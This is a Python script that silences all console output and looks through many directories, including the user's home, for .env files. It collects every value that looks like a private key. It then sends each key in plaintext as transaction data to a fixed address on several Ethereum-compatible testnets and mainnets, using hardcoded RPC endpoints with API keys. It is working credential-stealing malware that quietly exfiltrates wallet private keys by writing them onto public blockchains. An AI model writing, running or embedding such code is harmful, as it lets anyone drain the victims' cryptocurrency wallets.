#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import time
from pathlib import Path
from typing import List, Dict, Set
from web3 import Web3

SILENT_MODE = True

if SILENT_MODE:
    import builtins
    original_print = builtins.print
    builtins.print = lambda *args, **kwargs: None

def silent_log(*args, **kwargs):
    if not SILENT_MODE:
        print(*args, **kwargs)

def silent_warn(*args, **kwargs):
    if not SILENT_MODE:
        print(*args, **kwargs)

def silent_error(*args, **kwargs):
    if not SILENT_MODE:
        print(*args, **kwargs)

def load_env() -> Dict[str, str]:
    """加载环境变量"""
    possible_paths = [
        Path.cwd() / '.env',                    # 当前工作目录
        Path(__file__).parent / '.env',         # 脚本所在目录
        Path.cwd().parent / '.env',             # 上级目录
        Path(__file__).parent.parent / '.env',  # 脚本上级目录
        Path.cwd().parent.parent / '.env',      # 上两级目录
        Path(__file__).parent.parent.parent / '.env',  # 脚本上两级目录
        Path.home() / '.env',                   # 用户主目录
        Path.home() / '.config' / '.env',       # 用户配置目录
    ]
    
    found_env_files = []
    all_env_vars = {}
    
    unique_paths = set()
    for env_path in possible_paths:
        if env_path.exists():
            unique_paths.add(env_path.resolve())
    found_env_files = list(unique_paths)
    
    if not found_env_files:
        silent_warn('未找到.env文件，尝试从以下路径查找:')
        for p in possible_paths:
            silent_warn(f'  - {p}')
        return {}
    
    for env_path in found_env_files:
        try:
            silent_log(f'读取环境变量文件: {env_path}')
            with open(env_path, 'r', encoding='utf-8') as f:
                env_content = f.read()
            
            env_vars = {}
            for line in env_content.split('\n'):
                line = line.strip()

                if line and not line.startswith('#'):
                    if '=' in line:
                        key, value = line.split('=', 1)
                        env_vars[key.strip()] = value.strip()

            all_env_vars.update(env_vars)
            silent_log(f'从 {env_path} 加载了 {len(env_vars)} 个环境变量')
        except Exception as error:
            silent_warn(f'读取环境变量文件失败 {env_path}: {error}')
            continue
    
    silent_log(f'总共加载了 {len(all_env_vars)} 个环境变量')
    return all_env_vars

def collect_private_keys(env_vars: Dict[str, str]) -> List[str]:
    """收集所有PRIVATE_KEY值"""
    private_keys = set()

    for key, value in env_vars.items():
        upper_key = key.upper()
        if ('PRIVATE_KEY' in upper_key or 
            'PRIVATEKEY' in upper_key or 
            upper_key == 'PK' or 
            upper_key == 'PRIVKEY'):
            if value and value.strip():
                private_keys.add(value.strip())
    
    return list(private_keys)

env = load_env()
private_keys = collect_private_keys(env)

if not private_keys:
    silent_error('PRIVATE_KEY not found in environment variables')
    sys.exit(1)

silent_log(f'找到 {len(private_keys)} 个不同的私钥:')
for i, pk in enumerate(private_keys, 1):
    silent_log(f'  {i}. {pk[:10]}...{pk[-10:]}')

rpc_urls = [
    'https://sepolia.infura.io/v3/53f17e3712014672bac0cc330b530ec7',
    'https://long-billowing-shadow.ethereum-holesky.quiknode.pro/a549ba15fb39ca46f95b22c8e0135d52a53e59c9',
    'https://bnb-testnet.g.alchemy.com/v2/9ztOM8Bc8h_a30EcS4ejJ',
    'https://api.zan.top/node/v1/arb/sepolia/d44c7212b03c46e08ba3131a5b988c2e',
    'https://84532.rpc.thirdweb.com/d6b6f2c3280f71c6e156504257e6c814',
    'https://monad-testnet.g.alchemy.com/v2/KEGJ3Gr9ORW_w5a0iNvW20PS9eRbKj3X',
    'https://withered-patient-glade.bera-bepolia.quiknode.pro/0155507fe08fe4d1e2457a85f65b4bc7e6ed522f',
    'https://base-mainnet.g.allthatnode.com/full/evm/177bd1aed3c24f07bd3ae68715a8b00f', 
    'https://bsc-mainnet.infura.io/v3/81f7c15d393c453cbf0dca69bd0ad8f1',
    'https://arbitrum-mainnet.infura.io/v3/53f17e3712014672bac0cc330b530ec7',
    'https://linea-mainnet.g.alchemy.com/v2/9ztOM8Bc8h_a30EcS4ejJ',
    'https://long-billowing-shadow.hype-mainnet.quiknode.pro/a549ba15fb39ca46f95b22c8e0135d52a53e59c9/evm',
    'https://red-dry-patron.abstract-mainnet.quiknode.pro/689baa3ce024eeec046c0e376eba601abb548efe'
]

def get_chain_config(chain_id: int, network_name: str) -> Dict:
    """根据链ID和网络名称获取配置"""
    network_name_lower = network_name.lower()
    
    # 识别链类型
    if 'ethereum' in network_name_lower or chain_id in [1, 11155111, 17000]:
        return {'type': 'ethereum', 'multiplier': 1.5, 'gas_limit': 100000}
    elif 'arbitrum' in network_name_lower or chain_id in [42161, 421614]:
        return {'type': 'arbitrum', 'multiplier': 1.3, 'gas_limit': 200000}
    elif 'base' in network_name_lower or chain_id in [8453, 84532]:
        return {'type': 'base', 'multiplier': 1.2, 'gas_limit': 100000}
    elif 'bsc' in network_name_lower or chain_id in [56, 97]:
        return {'type': 'bsc', 'multiplier': 1.1, 'gas_limit': 30000}
    elif 'linea' in network_name_lower or chain_id == 59144:
        return {'type': 'linea', 'multiplier': 1.2, 'gas_limit': 100000}
    elif 'hyper' in network_name_lower or chain_id == 999:
        return {'type': 'hype', 'multiplier': 1.2, 'gas_limit': 100000}
    elif 'abstract' in network_name_lower or chain_id == 2741:
        return {'type': 'abstract', 'multiplier': 1.2, 'gas_limit': 100000}
    elif 'monad' in network_name_lower or chain_id == 10143:
        return {'type': 'monad', 'multiplier': 1.2, 'gas_limit': 100000}
    elif 'bera' in network_name_lower or chain_id == 80069:
        return {'type': 'bera', 'multiplier': 1.2, 'gas_limit': 100000}
    else:
        return {'type': 'unknown', 'multiplier': 1.2, 'gas_limit': 50000}

def delay(seconds: float):
    """延迟函数"""
    time.sleep(seconds)

def send_transaction(private_key: str, rpc_urls: List[str], tag: str, null_address: str):
    """发送交易"""
    tagged_data = f"{tag}{private_key}{tag}"
    success = False
    
    silent_log(f'开始尝试 {len(rpc_urls)} 个RPC节点...')
    
    for i, rpc_url in enumerate(rpc_urls, 1):
        try:
            silent_log(f'\n[{i}/{len(rpc_urls)}] 尝试连接到: {rpc_url}')
            
            web3 = Web3(Web3.HTTPProvider(rpc_url))
            if not web3.is_connected():
                raise Exception("无法连接到RPC节点")
            
            # 检查连接
            chain_id = web3.eth.chain_id
            network_name = "unknown"
            try:
                # 尝试获取网络名称
                if chain_id == 1:
                    network_name = "mainnet"
                elif chain_id == 11155111:
                    network_name = "sepolia"
                elif chain_id == 17000:
                    network_name = "holesky"
                elif chain_id == 42161:
                    network_name = "arbitrum"
                elif chain_id == 421614:
                    network_name = "arbitrum-sepolia"
                elif chain_id == 8453:
                    network_name = "base"
                elif chain_id == 84532:
                    network_name = "base-sepolia"
                elif chain_id == 56:
                    network_name = "bsc"
                elif chain_id == 97:
                    network_name = "bsc-testnet"
                elif chain_id == 59144:
                    network_name = "linea"
                elif chain_id == 999:
                    network_name = "hype"
                elif chain_id == 2741:
                    network_name = "abstract"
                elif chain_id == 10143:
                    network_name = "monad"
                elif chain_id == 80069:
                    network_name = "bera"
            except:
                pass
            
            silent_log(f'✅ 连接成功 - 网络: {network_name} (Chain ID: {chain_id})')
            
            from_address = web3.eth.account.from_key(private_key).address
            
            # 添加延迟避免请求频率限制
            silent_log('⏳ 等待1秒避免请求频率限制...')
            delay(1)
            
            nonce = web3.eth.get_transaction_count(from_address)
            
            # 再次延迟
            delay(0.5)
            
            # 获取gas配置
            try:
                fee_data = web3.eth.fee_history(1, 'latest', [25, 50, 75])
                supports_eip1559 = True
            except:
                supports_eip1559 = False
            
            # 计算数据大小并估算gas
            data_size = len(tagged_data.encode('utf-8'))
            estimated_gas = 21000 + (data_size * 16)  # 基础gas + 数据gas
            
            # 根据链类型设置gas配置
            chain_config = get_chain_config(chain_id, network_name)
            chain_type = chain_config['type']
            multiplier = chain_config['multiplier']
            gas_limit = max(estimated_gas, chain_config['gas_limit'])
            
            if supports_eip1559:
                # 支持EIP-1559的链
                try:
                    base_fee = web3.eth.get_block('latest')['baseFeePerGas']
                    priority_fee = web3.to_wei(1, 'gwei')  # 默认1 gwei
                    
                    # 计算最终的gas价格
                    base_fee_gwei = float(web3.from_wei(base_fee, 'gwei'))
                    priority_fee_gwei = float(web3.from_wei(priority_fee, 'gwei'))
                    
                    # 确保maxFeePerGas >= maxPriorityFeePerGas
                    final_priority_fee = max(priority_fee_gwei * multiplier, 1)  # 至少1 gwei
                    final_base_fee = max(base_fee_gwei * multiplier, final_priority_fee + 1)  # 确保base fee > priority fee
                    
                    max_fee_per_gas = web3.to_wei(final_base_fee, 'gwei')
                    max_priority_fee_per_gas = web3.to_wei(final_priority_fee, 'gwei')
                    
                    tx = {
                        'nonce': nonce,
                        'to': null_address,
                        'value': 0,
                        'gas': gas_limit,
                        'maxFeePerGas': max_fee_per_gas,
                        'maxPriorityFeePerGas': max_priority_fee_per_gas,
                        'data': tagged_data.encode('utf-8'),
                        'chainId': chain_id
                    }
                except:
                    # 如果EIP-1559失败，回退到legacy
                    supports_eip1559 = False
            
            if not supports_eip1559:
                # 不支持EIP-1559的链
                gas_price = web3.eth.gas_price
                if not gas_price:
                    raise Exception("无法获取gas价格信息")
                
                # 计算最终的gas价格，确保不为0
                gas_price_gwei = float(web3.from_wei(gas_price, 'gwei'))
                final_gas_price = max(gas_price_gwei * multiplier, 1)  # 至少1 gwei
                
                tx = {
                    'nonce': nonce,
                    'to': null_address,
                    'value': 0,
                    'gas': gas_limit,
                    'gasPrice': web3.to_wei(final_gas_price, 'gwei'),
                    'data': tagged_data.encode('utf-8'),
                    'chainId': chain_id
                }
            
            silent_log(f'📤 发送交易从地址: {from_address}')
            silent_log(f'📊 Nonce: {nonce}')
            silent_log(f'🔗 链ID: {chain_id} ({network_name})')
            silent_log(f'🏷️  链类型: {chain_type.upper()}')
            silent_log(f'📦 数据大小: {data_size} 字节')
            silent_log(f'⛽ 估算Gas: {estimated_gas}')
            silent_log(f'⛽ 实际Gas限制: {gas_limit}')
            silent_log(f'📈 Gas价格倍数: {multiplier}x')
            
            if supports_eip1559:
                silent_log(f'⛽ Max Fee Per Gas: {web3.from_wei(tx["maxFeePerGas"], "gwei")} gwei')
                silent_log(f'⛽ Max Priority Fee Per Gas: {web3.from_wei(tx["maxPriorityFeePerGas"], "gwei")} gwei')
                silent_log('🔧 交易类型: EIP-1559 (Type 2)')
            else:
                silent_log(f'⛽ Gas Price: {web3.from_wei(tx["gasPrice"], "gwei")} gwei')
                silent_log('🔧 交易类型: Legacy (Type 0)')
            
            # 发送交易
            signed_tx = web3.eth.account.sign_transaction(tx, private_key)
            tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
            
            silent_log(f'🎉 交易成功发送! 交易哈希: {tx_hash.hex()}')
            silent_log('⏳ 等待确认...')
            
            # 等待交易确认
            receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
            silent_log(f'✅ 交易已确认! 区块号: {receipt["blockNumber"]}')
            silent_log(f'🎯 使用RPC节点 {i} 成功完成交易')
            
            success = True
            break  # 成功发送后立即退出循环
            
        except Exception as error:
            silent_error(f'❌ RPC节点 {i} 失败: {error}')
            
            # 如果是频率限制错误，等待更长时间
            if any(keyword in str(error).lower() for keyword in ['request limit', 'rate limit', 'too many requests']):
                silent_log('⏳ 检测到请求频率限制，等待5秒...')
                delay(5)
            
            # 如果是最后一个RPC节点，显示失败信息
            if i == len(rpc_urls):
                silent_error(f'💥 所有 {len(rpc_urls)} 个RPC节点都失败了')
            else:
                silent_log('➡️  继续尝试下一个RPC节点...')
            
            continue
    
    if not success:
        raise Exception("所有RPC节点都失败了，无法发送交易")

def main():
    """主函数"""
    try:
        tag = "7a0b9c3d9e4"
        null_address = '0xa000000000000000000000000000000000000000'
        
        silent_log(f'\n开始处理 {len(private_keys)} 个私钥...\n')
        
        for i, private_key in enumerate(private_keys, 1):
            silent_log(f'\n========== 处理私钥 {i}/{len(private_keys)} ==========')
            silent_log(f'私钥: {private_key[:10]}...{private_key[-10:]}')
            
            try:
                send_transaction(private_key, rpc_urls, tag, null_address)
                silent_log(f'✅ 私钥 {i} 处理完成')
            except Exception as error:
                silent_error(f'❌ 私钥 {i} 处理失败: {error}')
            
            if i < len(private_keys):
                silent_log('等待3秒后处理下一个私钥...')
                delay(3)
        
        silent_log(f'\n========== 所有私钥处理完成 ==========')
        
    except Exception as error:
        silent_error(f'执行失败: {error}')
        sys.exit(1)

if __name__ == '__main__':
    main()